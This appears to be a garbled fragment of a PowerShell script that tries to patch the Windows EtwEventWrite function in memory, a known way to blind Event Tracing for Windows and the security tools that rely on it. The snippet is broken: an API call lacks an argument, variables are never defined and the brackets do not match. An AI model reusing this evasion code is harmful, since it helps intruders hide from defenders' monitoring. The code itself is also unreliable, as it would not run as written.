  (Add-Type -MemberDefinition '[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);' -Name K32 -PassThru)::GetProcAddress(

    'EtwEventWrite'),
  [System.Action]);
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, [Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($ntdll), 1)
